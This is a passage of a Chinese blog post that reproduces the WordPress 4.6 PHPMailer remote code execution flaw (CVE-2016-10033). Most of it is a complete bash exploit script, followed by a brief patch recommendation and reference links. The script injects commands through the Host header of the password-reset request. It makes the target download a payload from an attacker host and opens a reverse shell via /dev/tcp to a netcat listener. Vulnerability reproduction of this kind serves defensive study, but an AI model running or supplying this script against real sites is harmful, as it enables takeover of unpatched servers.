+<p>使用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./wordpress-rce-exploit.sh http://172.16.176.128:8000</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#      __                     __   __  __           __</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,&lt; /  __/ /  (__  )</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"> /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">           /____/</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">CVE-2016-10033</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># wordpress-rce-exploit.sh (ver. 1.0)</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Discovered and coded by</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Dawid Golunski (@dawid_golunski)</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://legalhackers.com</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ExploitBox project:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://ExploitBox.io</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Full advisory URL:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Exploit src URL:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://exploitbox.io/exploit/wordpress-rce-exploit.sh</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Tested on WordPress 4.6:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">https://github.com/WordPress/WordPress/archive/4.6.zip</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Usage:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">./wordpress-rce-exploit.sh target-wordpress-url</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Disclaimer:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">For testing purposes only</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">-----------------------------------------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Interested in vulns/exploitation?</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">                       .;lc<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">                   .,cdkkOOOko;.</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">                .,lxxkkkkOOOO000Ol&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">            .<span class="string">&#x27;:oxxxxxkkkkOOOO0000KK0x:&#x27;</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">         .;ldxxxxxxxxkxl,.<span class="string">&#x27;lk0000KKKXXXKd;.</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">      &#x27;</span>:oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">     <span class="string">&#x27;&#x27;</span>;ldxxxxxdc,.              ,oOXXXNNNXd;,.</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .ddc;,,:c;.         ,c:         .cxxc:;:ox:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxxc      .cNMMMN.oMMMMx<span class="string">&#x27;      .xxxxxx:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">    .dxxxxxc     lKo;dNMN.oMM0;:Ok.    &#x27;</span>xxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">    .dxxxxxc    ;Mc   .lx.:o,    Kl    <span class="string">&#x27;xxxxxx:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">    .dxxxxxdl;. .,               .. .;cdxxxxxx:</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">    .dxxxxxxxxxdc,.              &#x27;</span>cdkkxxxxxxxx:</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">     .<span class="string">&#x27;:oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">         .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">            .&#x27;</span>:oxxxxxxxxx.ckkkkkkkkxl,.</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">                .,cdxxxxx.ckkkkkxc.</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">                   .<span class="string">&#x27;:odx.ckxl,.</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash"><span class="string">                       .,.&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># https://ExploitBox.io</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># https://twitter.com/Exploit_Box</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># -----------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rev_host=&quot;172.16.176.1&quot;</span><br><span class="line"></span><br><span class="line">function prep_host_header() &#123;</span><br><span class="line">      cmd=&quot;$1&quot;</span><br><span class="line">      rce_cmd=&quot;\$&#123;run&#123;$cmd&#125;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">      # replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;</span><br><span class="line">      #sed &#x27;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&#x27;</span><br><span class="line">      rce_cmd=&quot;`echo $rce_cmd | sed &#x27;s^/^\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\$spool_directory&#125;&#125;^g&#x27;`&quot;</span><br><span class="line"></span><br><span class="line">      # replace &#x27; &#x27; (space) with</span><br><span class="line">      #sed &#x27;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&#x27;</span><br><span class="line">      rce_cmd=&quot;`echo $rce_cmd | sed &#x27;s^ ^\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\$tod_log&#125;&#125;^g&#x27;`&quot;</span><br><span class="line">      #return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;</span><br><span class="line">      host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;</span><br><span class="line">      return 0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="built_in">cat</span> exploitbox.ans</span></span><br><span class="line">intro=&quot;</span><br><span class="line">DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r</span><br><span class="line">bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f</span><br><span class="line">G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c</span><br><span class="line">G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg</span><br><span class="line">IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f</span><br><span class="line">IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f</span><br><span class="line">X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6</span><br><span class="line">b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb</span><br><span class="line">NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N</span><br><span class="line">TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1</span><br><span class="line">QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz</span><br><span class="line">NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g</span><br><span class="line">G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54</span><br><span class="line">eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb</span><br><span class="line">WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO</span><br><span class="line">TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg</span><br><span class="line">ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb</span><br><span class="line">MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD</span><br><span class="line">G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob</span><br><span class="line">WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz</span><br><span class="line">NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb</span><br><span class="line">MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f</span><br><span class="line">X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4</span><br><span class="line">bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;</span><br><span class="line">intro2=&quot;</span><br><span class="line">ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09</span><br><span class="line">fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb</span><br><span class="line">MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE</span><br><span class="line">aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09</span><br><span class="line">fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg</span><br><span class="line">ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh</span><br><span class="line">bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt</span><br><span class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt</span><br><span class="line">ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp</span><br><span class="line">bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1</span><br><span class="line">cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;</span><br><span class="line">echo &quot;$intro&quot;  | base64 -d</span><br><span class="line">echo &quot;$intro2&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">if [ &quot;$#&quot; -ne 1 ]; then</span><br><span class="line">echo -e &quot;Usage:\n$0 target-wordpress-url\n&quot;</span><br><span class="line">exit 1</span><br><span class="line">fi</span><br><span class="line">target=&quot;$1&quot;</span><br><span class="line">echo -ne &quot;\e[91m[*]\033[0m&quot;</span><br><span class="line">read -p &quot; Sure you want to get a shell on the target &#x27;$target&#x27; ? [y/N] &quot; choice</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [ &quot;$choice&quot; == &quot;y&quot; ]; then</span><br><span class="line"></span><br><span class="line">echo -e &quot;\e[92m[*]\033[0m Guess I can&#x27;t argue with that... Let&#x27;s get started...\n&quot;</span><br><span class="line">echo -e &quot;\e[92m[+]\033[0m Connected to the target&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Serve payload/bash script on :80</span></span><br><span class="line">RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;</span><br><span class="line">echo &quot;$RCE_exec_cmd&quot; &gt; rce.txt</span><br><span class="line">python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;</span><br><span class="line">hpid=$!</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Save payload on the target <span class="keyword">in</span> /tmp/rce</span></span><br><span class="line">cmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;</span><br><span class="line">prep_host_header &quot;$cmd&quot;</span><br><span class="line">curl -H&quot;Host: $host_header&quot; -s -d &#x27;user_login=admin&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpassword</span><br><span class="line">echo -e &quot;\n\e[92m[+]\e[0m Payload sent successfully&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</span></span><br><span class="line">cmd=&quot;/bin/bash /tmp/rce&quot;</span><br><span class="line">prep_host_header &quot;$cmd&quot;</span><br><span class="line">curl -H&quot;Host: $host_header&quot; -d &#x27;user_login=admin&amp;wp-submit=Get+New+Password&#x27; $target/wp-login.php?action=lostpassword &amp;</span><br><span class="line">echo -e &quot;\n\e[92m[+]\033[0m Payload executed!&quot;</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n&quot;</span><br><span class="line">nc -nvv -l -p 1337</span><br><span class="line">echo</span><br><span class="line">else</span><br><span class="line">echo -e &quot;\e[92m[+]\033[0m Responsible choice ;) Exiting.\n&quot;</span><br><span class="line">exit 0</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;Exiting...&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>更新wordpress、phpmailer到最新版本</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/161/" >https://paper.seebug.org/161/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://bobao.360.cn/news/detail/4146.html" >http://bobao.360.cn/news/detail/4146.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://vulapps.evalbug.com/w_wordpress_6/" >http://vulapps.evalbug.com/w_wordpress_6/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/opsxcq/exploit-CVE-2016-10033" >https://github.com/opsxcq/exploit-CVE-2016-10033<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/wordpress/pwnscriptum" >https://github.com/vulhub/vulhub/tree/master/wordpress/pwnscriptum<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：WordPress &lt;= 4.6 命令执行漏洞(PHPMailer)复现分析</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2018-04-20 19:48:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2018/04/wordpress-4-6-命令执行漏洞-phpmailer-复现分析/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/WordPress/">#WordPress</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2018/09/mobaxterm-v10-9%E7%A0%B4%E8%A7%A3/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">MobaXterm v10.9破解</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2017/12/%E6%9E%84%E5%BB%BA%E5%9F%BA%E4%BA%8Esuricata-splunk%E7%9A%84ids%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">构建基于Suricata+Splunk的IDS入侵检测系统</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%8F%B7"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞编号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.2.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="nav-number">3.0.1.</span> <span class="nav-text">执行任意命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%85%A5shell"><span class="nav-number">3.0.2.</span> <span class="nav-text">写入shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.0.2.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9Dwebshell"><span class="nav-number">3.0.2.2.</span> <span class="nav-text">写入一句话webshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">3.0.3.</span> <span class="nav-text">POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 